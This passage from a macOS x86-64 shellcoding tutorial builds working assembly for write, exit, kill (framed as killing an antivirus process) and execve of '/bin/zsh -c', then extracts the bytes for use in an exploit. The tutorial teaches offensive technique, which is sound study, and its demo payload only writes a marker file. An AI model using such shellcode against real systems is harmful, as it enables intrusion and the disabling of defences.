Sequoia-compatible API stubs and system call encodings ‚Äî essential for forward and backward compatibility on modern Apple silicon and Intel systems.</p>\n</blockquote>\n<ul>\n<li>Let‚Äôs run and test our executable:</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">shellcoding % ./hello </span><br><span class=\"line\">Hellozsh: segmentation fault  ./hello</span><br></pre></td></tr></table></figure>\n\n<p>We see that our execution results in <code>segmentation fault</code>, And the reason for that the program doesn‚Äôt <code>return</code> or in simple words exit. For example, Within the main function in <code>C</code>, When return is used in the main function (e.g., <code>return 0;</code>), it typically translates to an <code>exit_group</code> system call (<code>exit</code>). This system call terminates the entire process and returns the specified exit status to the operating system. So, We need to exit after executing our <code>write</code> syscall.</p>\n<h2 id=\"Exit\"><a href=\"#Exit\" class=\"headerlink\" title=\"Exit\"></a>Exit</h2><p>We can exit using <code>exit</code> syscall, as we can see it in the <code>syscalls.master</code> file:</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>\tAUE_EXIT\tALL\t&#123; <span class=\"type\">void</span> <span class=\"title function_\">exit</span><span class=\"params\">(<span class=\"type\">int</span> rval)</span> NO_SYSCALL_STUB; &#125;</span><br></pre></td></tr></table></figure>\n\n<p>The syscall number is <code>1</code> and it takes only 1 integer argument <code>rval</code> which is the value to return. When we go to documentation the <code>rval</code> value can be <code>0</code> for <code>EXIT_SUCCESS</code> (successful execution of a program) or <code>EXIT_FAILURE</code> (unsuccessful execution of a program). Let‚Äôs update our shellcode and add <code>exit</code> syscall</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">bits 64</span><br><span class=\"line\"></span><br><span class=\"line\">global _main</span><br><span class=\"line\"></span><br><span class=\"line\">_main:</span><br><span class=\"line\">\tmov rdi, 1 ; stdout for fd argument</span><br><span class=\"line\">\tmov rcx, &#x27;Hello&#x27; ; put our string value into RCX</span><br><span class=\"line\">\tpush rcx ; We push our string to the stack</span><br><span class=\"line\">\tmov rsi, rsp ; we supply the pointer to our string from RSP to RSI which is buf argument</span><br><span class=\"line\">\tmov rdx, 5 ; nbytes argument (our string length)</span><br><span class=\"line\">\tmov rax, 0x2000004 ; The BSD syscall class entry + write syscall number</span><br><span class=\"line\">\tsyscall ; invoke/execute syscall</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tmov rax, 0x2000001 ; The BSD syscall class entry + exit syscall</span><br><span class=\"line\">\tmov rdi, 0 ; arg int rval</span><br><span class=\"line\">\tsyscall ; invoke/execute syscall</span><br></pre></td></tr></table></figure>\n\n<p>Now, let‚Äôs repeat the process of compiling to get our executable again and test it.</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">shellcoding % nasm -f macho64 hello.asm</span><br><span class=\"line\">shellcoding % ld -o hello hello.o -L /Library/Developer/CommandLineTools/SDKs/MacOSX15.5.sdk/usr/lib -lSystem -platform_version macOS 15.5 15.5</span><br><span class=\"line\">ld: warning: no platform load <span class=\"built_in\">command</span> found <span class=\"keyword\">in</span> <span class=\"string\">&#x27;/Users/zeyadazima.com/shellcoding/hello.o&#x27;</span>, assuming: macOS</span><br><span class=\"line\">shellcoding % ./hello </span><br><span class=\"line\">Hello%                                                           </span><br><span class=\"line\">shellcoding % </span><br></pre></td></tr></table></figure>\n\n<p>As we see clearly our code worked perfectly. </p>\n<h2 id=\"Kill-a-Process\"><a href=\"#Kill-a-Process\" class=\"headerlink\" title=\"Kill a Process\"></a>Kill a Process</h2><p>Let‚Äôs do another shellcode, And take a scenario in case we found a way to execute a code with high privileges and We need to write a shellcode to kill the <code>AV</code> process.</p>\n<p>The <code>C</code> code to kill a process is as the following:</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;signal.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/types.h&gt;</span> <span class=\"comment\">// For pid_t</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span>    <span class=\"comment\">// For getpid() (optional, for self-killing example)</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">pid_t</span> target_pid;</span><br><span class=\"line\"></span><br><span class=\"line\">    target_pid = <span class=\"number\">12345</span>; </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Sending SIGTERM (graceful termination)</span></span><br><span class=\"line\">    kill(target_pid, SIGTERM);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>We can see here we used <code>kill</code> function and supply the <code>PID</code> and the signal which is <code>SIGTERM</code>.</p>\n<p>Now, If we search for <code>kill</code> in <code>syscalls.master</code>. We can find it:</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">37</span>\tAUE_KILL\tALL\t&#123; <span class=\"type\">int</span> <span class=\"title function_\">kill</span><span class=\"params\">(<span class=\"type\">int</span> pid, <span class=\"type\">int</span> signum, <span class=\"type\">int</span> posix)</span> NO_SYSCALL_STUB; &#125;</span><br></pre></td></tr></table></figure>\n\n<p>For the <code>PID</code> we will create a test process and get it‚Äôs <code>PID</code> to supply it for the first argument and for the <code>signum</code> argument, In the <code>C</code> code the value is <code>SIGTERM</code> which it will be a pre-defined value in the source code, We can search for <code>#define SIGTERM</code> in the <code>XNU</code> source code, We will find it at <code>xnu-xnu-11417.121.6/bsd/sys/signal.h:103</code>:</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SIGKILL 9       <span class=\"comment\">/* kill (cannot be caught or ignored) */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SIGBUS  10      <span class=\"comment\">/* bus error */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SIGSEGV 11      <span class=\"comment\">/* segmentation violation */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SIGSYS  12      <span class=\"comment\">/* bad argument to system call */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SIGPIPE 13      <span class=\"comment\">/* write on a pipe with no one to read it */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SIGALRM 14      <span class=\"comment\">/* alarm clock */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SIGTERM 15      <span class=\"comment\">/* software termination signal from kill */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SIGURG  16      <span class=\"comment\">/* urgent condition on IO channel */</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SIGSTOP 17      <span class=\"comment\">/* sendable stop signal not from tty */</span></span></span><br></pre></td></tr></table></figure>\n\n<p>So we can see that <code>SIGTERM</code> value is <code>15</code>, But the better option to use <code>SIGKILL</code> with value <code>9</code> as it will be forced and kill (cannot be caught or ignored). We will supply <code>9</code> as the second argument. Now, In the <code>C</code> code it doesn‚Äôt have a 3rd argument as we see for the <code>syscall</code>. If we search for <code>int posix</code> in the <code>XNU</code> source code, We gonna find the following code under <code>xnu-xnu-11417.121.6/bsd/kern/kern_sig.c:1373</code>:</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span></span><br><span class=\"line\"><span class=\"title function_\">kill</span><span class=\"params\">(<span class=\"type\">proc_t</span> cp, <span class=\"keyword\">struct</span> kill_args *uap, __unused <span class=\"type\">int32_t</span> *retval)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">proc_t</span> p;</span><br><span class=\"line\">\t<span class=\"type\">kauth_cred_t</span> uc = kauth_cred_get();</span><br><span class=\"line\">\t<span class=\"type\">int</span> posix = uap-&gt;posix;         <span class=\"comment\">/* !0 if posix behaviour desired */</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tAUDIT_ARG(pid, uap-&gt;pid);</span><br><span class=\"line\">\tAUDIT_ARG(signum, uap-&gt;signum);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> ((u_int)uap-&gt;signum &gt;= NSIG) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> EINVAL;</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n\n<p>We can see from apple comment on the source code that, if we want <code>POSIX</code> behaviour in killing the process we have to supply anything other than <code>0</code>. And after more searching and asking diff <code>AI</code> chatbots i got the following:</p>\n<table>\n<thead>\n<tr>\n<th>Value</th>\n<th>Meaning</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>posix = 0</code></td>\n<td>Mach (legacy) signal behavior</td>\n</tr>\n<tr>\n<td><code>posix = 1</code> (or any <code>!0</code>)</td>\n<td>POSIX&#x2F;BSD signal behavior</td>\n</tr>\n</tbody></table>\n<blockquote>\n<p>Note: usually when you see extra arguments that was not mentioned or supplyed in the <code>C</code> code, It means that the argument is optional and not really required so you always can supply <code>0</code> or <code>NULL</code> as a value to the optional&#x2F;non-required arguments.<br>Let‚Äôs run our test process using a simple infinity loop running in background:</p>\n</blockquote>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">shellcoding % <span class=\"keyword\">while</span> <span class=\"literal\">true</span>; <span class=\"keyword\">do</span> <span class=\"built_in\">sleep</span> 10; <span class=\"keyword\">done</span> &amp;</span><br><span class=\"line\">[2] 27646</span><br><span class=\"line\">shellcoding % ps -p 27646</span><br><span class=\"line\">  PID TTY           TIME CMD</span><br><span class=\"line\">27646 ttys061    0:00.01 -zsh</span><br></pre></td></tr></table></figure>\n<p>the <code>PID</code> is <code>27646</code></p>\n<p>Now, Lets write our shellcode:</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">bits 64</span><br><span class=\"line\"></span><br><span class=\"line\">global _main</span><br><span class=\"line\"></span><br><span class=\"line\">_main:</span><br><span class=\"line\">\tmov rdi, 27646 ; 1st argument PID</span><br><span class=\"line\">\tmov rsi, 9 ; 2nd argument signum</span><br><span class=\"line\">\tmov rdx, 0 ; 3rd argument posix</span><br><span class=\"line\">\tmov rax, 0x2000025 ; The BSD syscall class entry + 0x25 (which is 37 in hex) kill syscall</span><br><span class=\"line\">\tsyscall</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tmov rax, 0x2000001 ; The BSD syscall class entry + exit syscall</span><br><span class=\"line\">\tmov rdi, 0 ; arg int rval</span><br><span class=\"line\">\tsyscall ; invoke/execute syscall</span><br></pre></td></tr></table></figure>\n\n<p>It‚Äôs already clear here, We passed our arguments as the following; <code>PID</code> for <code>RDI</code>, then <code>signum</code> for <code>RSI</code> and After that, <code>posix</code> to <code>RDX</code> and setup our <code>syscall</code>. Finally, We exit gracefully using <code>exit</code> syscall.</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">shellcoding % nasm -f macho64 killer.asm                                                                                                       </span><br><span class=\"line\">shellcoding % ld -o killer killer.o -L /Library/Developer/CommandLineTools/SDKs/MacOSX15.5.sdk/usr/lib -lSystem -platform_version macOS 15.5 15.5</span><br><span class=\"line\">ld: warning: no platform load <span class=\"built_in\">command</span> found <span class=\"keyword\">in</span> <span class=\"string\">&#x27;/Users/zeyadazima.com/shellcoding/killer.o&#x27;</span>, assuming: macOS</span><br><span class=\"line\">shellcoding % ./killer </span><br><span class=\"line\">shellcoding % </span><br><span class=\"line\">[2]  - killed     <span class=\"keyword\">while</span> <span class=\"literal\">true</span>; <span class=\"keyword\">do</span>; <span class=\"built_in\">sleep</span> 10; <span class=\"keyword\">done</span></span><br><span class=\"line\">shellcoding % ps -p 27646</span><br><span class=\"line\">  PID TTY           TIME CMD</span><br></pre></td></tr></table></figure>\n\n<p>As we can see clearly, The process has been killed successfully.</p>\n<h2 id=\"Execute-Command\"><a href=\"#Execute-Command\" class=\"headerlink\" title=\"Execute Command\"></a>Execute Command</h2><p>Now, The exciting parts where we need to execute commands. Let‚Äôs bring our <code>C</code> code to execute commands on the system. Which is usually in <code>C</code> it‚Äôs done through <code>system()</code> function. But remember that on the <code>XNU</code> has <code>BSD</code>. So Let‚Äôs search for <code>C</code> code where execute commands using <code>BSD</code> functions.</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/wait.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">pid_t</span> pid;</span><br><span class=\"line\">    <span class=\"type\">char</span> *<span class=\"type\">const</span> argv[] = &#123;<span class=\"string\">&quot;/bin/ls&quot;</span>, <span class=\"string\">&quot;-l&quot;</span>, <span class=\"literal\">NULL</span>&#125;; <span class=\"comment\">// Command and its arguments</span></span><br><span class=\"line\">    <span class=\"type\">char</span> *<span class=\"type\">const</span> envp[] = &#123;<span class=\"literal\">NULL</span>&#125;; <span class=\"comment\">// Environment variables (can be customized)</span></span><br><span class=\"line\"></span><br><span class=\"line\">    execve(argv[<span class=\"number\">0</span>], argv, envp);</span><br><span class=\"line\">   </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>As we can see here it uses <code>execv()</code> function and it takes 3 arguments. lET‚ÄôS SEARCH FOR it in the <code>syscalls.master</code>:</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">59</span>\tAUE_EXECVE\tALL\t&#123; <span class=\"type\">int</span> <span class=\"title function_\">execve</span><span class=\"params\">(<span class=\"type\">char</span> *fname, <span class=\"type\">char</span> **argp, <span class=\"type\">char</span> **envp)</span> NO_SYSCALL_STUB; &#125;</span><br></pre></td></tr></table></figure>\n\n<p>So it takes a pointer to the <code>fname</code> which is the file name, then pointer to array <code>argp</code> and pointer to another array <code>envp</code>.</p>\n<p><img src=\"/images/site/posts/macos/write-syscall-chain.png\" alt=\"write syscall chain snippet\"></p>\n<p>We can see that in the description of <code>execve()</code>, the first argument is the path to the binary we want to execute which is gonna be the shell in this case <code>/bin/zsh</code>. Then for the second argument it takes array the arguments of the executable or program we passing and the first element in the array has to be the same file name <code>/bin/zsh</code>, So the array will be as the following, if we want to execute<code>echo &quot;W00tW00t&quot; &gt; /tmp/Pwned.txt</code>  command <code>&#123;&quot;/bin/zsh&quot;,&quot;-c&quot;,&quot;echo &#39;W00tW00t&#39; &gt; /tmp/Pwned.txt&quot;&#125;</code>. The third argument as mentioned is optional so we can supply a pointer to <code>NULL</code> array.</p>\n<p>Let‚Äôs go on and write our shellcode:</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">bits 64</span><br><span class=\"line\"></span><br><span class=\"line\">global _main</span><br><span class=\"line\"></span><br><span class=\"line\">_main:</span><br><span class=\"line\"></span><br><span class=\"line\">\tmov rcx, 0 \t; NULL Terminator</span><br><span class=\"line\">\tpush rcx \t; push the NULL Terminator to the stack</span><br><span class=\"line\">\tmov rdx, &#x27;/bin/zsh&#x27; \t;  our file/executable name</span><br><span class=\"line\">\tpush rdx \t; push the file/executable name to the stack</span><br><span class=\"line\">\tmov rdi, rsp \t; fname =&gt; 1st argument which by Copy the RSP address to RDI which is the pointer to our file/executable name</span><br><span class=\"line\">\tmov rbx, &#x27;-c&#x27; \t; argp[1] =&gt; the 2nd element in the arguments array</span><br><span class=\"line\">\tpush rbx \t; push argp[1] to the stack</span><br><span class=\"line\">\tmov rbx, rsp \t; save the argp[1](&#x27;-c&#x27;) pointer to RBX</span><br><span class=\"line\">\tpush rcx \t; push the NULL Terminator to the stack</span><br></pre></td></tr></table></figure>\n\n<p>Let‚Äôs stop here for a while, We need to place our 3rd element which is our command <code>echo &quot;W00tW00t&quot; &gt; /tmp/Pwned.txt</code>, Which is for a string to long and to divide it to push it on the stack will not be the best thing our shellcode will be so long. Instead we gonna use a trick to place it on the stack for example:</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">call array</span><br><span class=\"line\">db &#x27;echo &quot;W00tW00t&quot; &gt; /tmp/Pwned.txt&#x27;, 0</span><br></pre></td></tr></table></figure>\n\n<p><code>call</code> pushes the address of the following <code>db</code> string onto the stack. Which will make it easier for us.</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">bits 64</span><br><span class=\"line\"></span><br><span class=\"line\">global _main</span><br><span class=\"line\"></span><br><span class=\"line\">_main:</span><br><span class=\"line\"></span><br><span class=\"line\">\txor rcx, rcx \t; NULL Terminator</span><br><span class=\"line\">\tpush rcx \t; push the NULL Terminator to the stack</span><br><span class=\"line\">\tmov rdx, &#x27;/bin/zsh&#x27; \t;  our file/executable name</span><br><span class=\"line\">\tpush rdx \t; push the file/executable name to the stack</span><br><span class=\"line\">\tmov rdi, rsp \t; fname =&gt; 1st argument which by Copy the RSP address to RDI which is the pointer to our file/executable name</span><br><span class=\"line\">\tmov rbx, &#x27;-c&#x27; \t; argp[1] =&gt; the 2nd element in the arguments array</span><br><span class=\"line\">\tpush rbx \t; push argp[1] to the stack</span><br><span class=\"line\">\tmov rbx, rsp \t; save the argp[1](&#x27;-c&#x27;) pointer to RBX</span><br><span class=\"line\">\tpush rcx \t; push the NULL Terminator to the stack</span><br><span class=\"line\"></span><br><span class=\"line\">; classic position-independent trick</span><br><span class=\"line\">\tcall array ; call the array label to setup the array for argp</span><br><span class=\"line\">\tdb &#x27;echo &quot;W00tW00t&quot; &gt; /tmp/Pwned.txt&#x27;, 0 ; arg[2] which is our command and including the NULL Terminator</span><br></pre></td></tr></table></figure>\n\n<p>Now, We need to make <code>array</code> label where it will setup the array elements and execute the <code>execve</code> syscall and then exit.</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">bits 64</span><br><span class=\"line\"></span><br><span class=\"line\">global _main</span><br><span class=\"line\"></span><br><span class=\"line\">_main:</span><br><span class=\"line\"></span><br><span class=\"line\">\txor rcx, rcx \t; NULL Terminator</span><br><span class=\"line\">\tpush rcx \t; push the NULL Terminator to the stack</span><br><span class=\"line\">\tmov rdx, &#x27;/bin/zsh&#x27; \t;  our file/executable name</span><br><span class=\"line\">\tpush rdx \t; push the file/executable name to the stack</span><br><span class=\"line\">\tmov rdi, rsp \t; fname =&gt; 1st argument which by Copy the RSP address to RDI which is the pointer to our file/executable name</span><br><span class=\"line\">\tmov rbx, &#x27;-c&#x27; \t; argp[1] =&gt; the 2nd element in the arguments array</span><br><span class=\"line\">\tpush rbx \t; push argp[1] to the stack</span><br><span class=\"line\">\tmov rbx, rsp \t; save the argp[1](&#x27;-c&#x27;) pointer to RBX</span><br><span class=\"line\">\tpush rcx \t; push the NULL Terminator to the stack</span><br><span class=\"line\">\tcall array ; call the array label to setup the array for argp</span><br><span class=\"line\">\tdb &#x27;echo &quot;W00tW00t&quot; &gt; /tmp/Pwned.txt&#x27;, 0 ; arg[2] which is our command and including the NULL Terminator</span><br><span class=\"line\">\t</span><br><span class=\"line\">array:</span><br><span class=\"line\">\tpush rbx ; arg[1] put the -c pointer into the array</span><br><span class=\"line\">\tpush rdi ; args[0] which is fname saved before</span><br><span class=\"line\">\tmov rsi, rsp ; pass the array pointer for RSI which holds the second argument</span><br><span class=\"line\">\txor rdx, rdx ; empty rdx to use as NULL for the third argument envp</span><br><span class=\"line\">\tmov rax, 0x200003B ; The BSD syscall class entry + 0x3B (which is 59 in hex) kill syscall</span><br><span class=\"line\">\tsyscall ; invoke/execute syscall</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tmov rax, 0x2000001 ; The BSD syscall class entry + exit syscall</span><br><span class=\"line\">\tmov rdi, 0 ; arg int rval</span><br><span class=\"line\">\tsyscall ; invoke/execute syscall</span><br></pre></td></tr></table></figure>\n\n<p>Here our shellcode, first zeroes <code>RCX</code> with <code>xor rcx, rcx</code> and <code>push rcx</code> to place an 8-byte <code>NULL</code> on the stack which will be reused as padding and as a <code>NULL</code> terminator. Next <code>mov rdx, &#39;/bin/zsh&#39;</code> loads the bytes for the <code>filename</code> into <code>RDX</code> and <code>push rdx</code> writes those 8 bytes to the stack so that <code>RSP</code> now points at the <code>&quot;/bin/zsh&quot;</code> string. <code>mov rdi, rsp</code> copies that stack pointer into <code>RDI</code>, which is the first argument to <code>execve</code> (the <code>filename</code> pointer).After that load <code>&#39;-c&#39;</code> into <code>RBX</code> and <code>push rbx</code>, creating the <code>&quot;-c&quot;</code> string on the stack; <code>mov rbx, rsp</code> saves the pointer to the <code>&quot;-c&quot;</code> string in <code>RBX</code> for later. Another <code>push rcx</code> places a <code>NULL</code> on the stack. The <code>call array</code> instruction is the classic position-independent trick, it pushes the address of the immediately following <code>db</code> bytes (the command string) onto the stack and then jumps to the <code>array</code> label, so the command string‚Äôs runtime address is already on the stack when <code>array</code> executes. The <code>db &#39;echo &quot;W00tW00t&quot; &gt; /tmp/Pwned.txt&#39;, 0</code> provides the NUL-terminated command that <code>zsh -c</code> will execute. Then, At <code>array</code>  label we will build the <code>argp</code> array by <code>push rbx</code> (push pointer to <code>&quot;-c&quot;</code>) and <code>push rdi</code> (push pointer to <code>&quot;/bin/zsh&quot;</code>), then <code>mov rsi, rsp</code> sets <code>RSI</code> to point at that array so <code>execve</code> receives <code>argp</code> correctly. Following <code>xor rdx, rdx</code> sets <code>RDX = 0</code> so <code>envp</code> is <code>NULL</code>. <code>mov rax, 0x200003B</code> loads the <code>BSD</code> syscall number for <code>execve</code>.</p>\n<blockquote>\n<p>Note: <code>0x3B</code> &#x3D; 59 decimal ‚Üí <code>execve</code></p>\n</blockquote>\n<p>And <code>syscall</code> invokes the kernel to execute <code>execve(filename, argv, envp)</code>. If <code>execve</code> returns (i.e., it failed) the code falls through to <code>mov rax, 0x2000001</code> &#x2F; <code>mov rdi, 0</code> &#x2F; <code>syscall</code> which calls the <code>exit</code> syscall to terminate the process.</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">shellcoding % nasm -f macho64 execute.asm                                                                                                          </span><br><span class=\"line\">shellcoding % ld -o execute execute.o -L /Library/Developer/CommandLineTools/SDKs/MacOSX15.5.sdk/usr/lib -lSystem -platform_version macOS 15.5 15.5</span><br><span class=\"line\">ld: warning: no platform load <span class=\"built_in\">command</span> found <span class=\"keyword\">in</span> <span class=\"string\">&#x27;/Users/zeyadazima.com/shellcoding/execute.o&#x27;</span>, assuming: macOS</span><br><span class=\"line\">shellcoding % <span class=\"built_in\">ls</span> /tmp</span><br><span class=\"line\">node-compile-cache OSL_PIPE_501_SingleOfficeIPC\tpowerlog</span><br><span class=\"line\">shellcoding % ./execute                                                                                                                            </span><br><span class=\"line\">shellcoding % <span class=\"built_in\">ls</span> /tmp  </span><br><span class=\"line\">node-compile-cache OSL_PIPE_501_SingleOfficeIPC\tpowerlog Pwned.txt</span><br><span class=\"line\">/tmp % <span class=\"built_in\">cat</span> Pwned.txt </span><br><span class=\"line\">W00tW00t</span><br></pre></td></tr></table></figure>\n\n<p>We can see clearly, That our shellcode is executed successfully and our file created.</p>\n<h1 id=\"Extract-Shellcode\"><a href=\"#Extract-Shellcode\" class=\"headerlink\" title=\"Extract Shellcode\"></a>Extract Shellcode</h1><p>Now, Let‚Äôs extract our shellcode from the object file, So if we need to send it with our exploit. We will use <code>objdump</code> tool and will show also how to do it with <code>otool</code>.</p>\n<h2 id=\"objdump\"><a href=\"#objdump\" class=\"headerlink\" title=\"objdump\"></a>objdump</h2>```<table><tr><td class=\"code\"><pre><span class=\"line\">shellcoding% objdump --disassemble --x86-asm-syntax=intel ~/shellcoding/execute.o</span><br><span class=\"line\"></span><br><span class=\"line\">execute.o:\tfile format mach-o 64-bit x86-64</span><br><span class=\"line\"></span><br><span class=\"line\">Disassembly of section __TEXT,__text:</span><br><span class=\"line\"></span><br><span class=\"line\">0000000000000000 &lt;_main&gt;:</span><br><span class=\"line\">       0: 48 31 c9                     \txor\trcx, rcx</span><br><span class=\"line\">       3: 51                           \tpush\trcx</span><br><span class=\"line\">       4: 48 ba 2f 62 69 6e 2f 7a 73 68\tmovabs\trdx, 0x68737a2f6e69622f</span><br><span class=\"line\">       e: 52                           \tpush\trdx</span><br><span class=\"line\">       f: 48 89 e7                     \tmov\trdi, rsp</span><br><span class=\"line\">      12: bb 2d 63 00 00               \tmov\tebx, 0x632d</span><br><span class=\"line\">      17: 53                           \tpush\trbx</span><br><span class=\"line\">      18: 48 89 e3                     \tmov\trbx, rsp</span><br><span class=\"line\">      1b: 51                           \tpush\trcx</span><br><span class=\"line\">      1c: e8 21 00 00 00               \tcall\t0x42 &lt;array&gt;</span><br><span class=\"line\">      21: 65 63 68 6f                  \tmovsxd\tebp, dword ptr gs:[rax + 0x6f]</span><br><span class=\"line\">      25: 20 22                        \tand\tbyte ptr [rdx], ah</span><br><span class=\"line\">      27: 57                           \tpush\trdi</span><br><span class=\"line\">      28: 30 30                        \txor\tbyte ptr [rax], dh</span><br><span class=\"line\">      2a: 74 57                        \tje\t0x83 &lt;array+0x41&gt;</span><br><span class=\"line\">      2c: 30 30                        \txor\tbyte ptr [rax], dh</span><br><span class=\"line\">      2e: 74 22                        \tje\t0x52 &lt;array+0x10&gt;</span><br><span class=\"line\">      30: 20 3e                        \tand\tbyte ptr [rsi], bh</span><br><span class=\"line\">      32: 20 2f                        \tand\tbyte ptr [rdi], ch</span><br><span class=\"line\">      34: 74 6d                        \tje\t0xa3 &lt;array+0x61&gt;</span><br><span class=\"line\">      36: 70 2f                        \tjo\t0x67 &lt;array+0x25&gt;</span><br><span class=\"line\">      38: 50                           \tpush\trax</span><br><span class=\"line\">      39: 77 6e                        \tja\t0xa9 &lt;array+0x67&gt;</span><br><span class=\"line\">      3b: 65 64 2e 74 78               \tje\t0xb8 &lt;array+0x76&gt;</span><br><span class=\"line\">      40: 74 00                        \tje\t0x42 &lt;array&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">0000000000000042 &lt;array&gt;:</span><br><span class=\"line\">      42: 53                           \tpush\trbx</span><br><span class=\"line\">      43: 57                           \tpush\trdi</span><br><span class=\"line\">      44: 48 89 e6                     \tmov\trsi, rsp</span><br><span class=\"line\">      47: 48 31 d2                     \txor\trdx, rdx</span><br><span class=\"line\">      4a: b8 3b 00 00 02               \tmov\teax, 0x200003b</span><br><span class=\"line\">      4f: 0f 05                        \tsyscall</span><br><span class=\"line\">      51: b8 01 00 00 02               \tmov\teax, 0x2000001</span><br><span class=\"line\">      56: bf 00 00 00 00               \tmov\tedi, 0x0</span><br><span class=\"line\">      5b: 0f 05                        \tsyscall</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>Here we can see our dissassembled code clearly and the array, etc. We need to save this into file</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">objdump --disassemble --x86-asm-syntax=intel ~/shellcoding/execute.o &gt; execute.disasm</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>Now, Let‚Äôs extract the hex bytes from the <code>execute.disasm</code> file. Using command line utilities.</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">shellcoding% grep -E <span class=\"string\">&#x27;^[[:space:]]+[0-9a-f]+:&#x27;</span> execute.disasm \\</span><br><span class=\"line\">  | awk <span class=\"string\">&#x27;&#123;for(i=2;i&lt;=NF;i++) if ($i ~ /^[0-9a-f]&#123;2&#125;$/) printf &quot;%s&quot;, $i&#125;&#x27;</span> \\</span><br><span class=\"line\">  | <span class=\"built_in\">tr</span> -d <span class=\"string\">&#x27;\\n&#x27;</span> &gt; shellcode.hex</span><br><span class=\"line\">shellcoding% <span class=\"built_in\">cat</span> shellcode.hex </span><br><span class=\"line\">4831c95148ba2f62696e2f7a7368524889e7bb2d630000534889e351e8210000006563686f2022573030745730307422203e202f746d702f50776e65642e7478740053574889e64831d2b83b0000020f05b801000002bf000000000f05</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>Convert it to binary</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">shellcoding% xxd -r -p shellcode.hex &gt; shellcode.bin</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>Let‚Äôs Check the Shellcode size</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">shellcoding% <span class=\"built_in\">wc</span> -c shellcode.bin</span><br><span class=\"line\">      93 shellcode.bin // 93 bytes</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>Generate <code>C</code> array of bytes for the shellcode</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">shellcoding% xxd -i shellcode.bin &gt; shellcode.h</span><br><span class=\"line\">shellcoding% <span class=\"built_in\">cat</span> shellcode.h</span><br><span class=\"line\">unsigned char shellcode_bin[] = &#123;</span><br><span class=\"line\">  0x48, 0x31, 0xc9, 0x51, 0x48, 0xba, 0x2f, 0x62, 0x69, 